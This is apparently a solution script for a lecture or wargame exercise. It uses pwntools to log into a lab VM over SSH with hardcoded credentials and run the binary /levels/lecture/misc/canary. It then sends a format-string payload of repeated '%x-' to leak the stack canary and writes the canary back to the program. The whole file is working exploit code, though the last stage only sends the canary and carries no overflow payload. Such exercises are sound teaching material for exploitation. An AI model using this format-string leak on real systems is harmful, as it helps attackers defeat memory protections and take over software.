import struct

from pwn import *

def main():

  session = ssh(host="192.168.159.129", user="lecture", password="lecture")
  sh = session.process("/bin/sh", env={"PS1":""})

  sendget(sh, "/levels/lecture/misc/canary")

  cookie = sendget(sh, "%x-" * 150, True).split(b'-')[134]
  cookie = int(b"".join((b"0x", cookie)), 16)

  log.info("Cookie Leaked: 0x%x" % cookie)
  exploit(sh, cookie)

def exploit(sh, cookie):

  cookie = struct.pack('<I', cookie)
  sendget(sh, cookie)

def sendget(sh, message, print_output=False):

  sh.sendline(message)
  if print_output == False:
    sh.read()
  else:
    return sh.read()

  return

main()
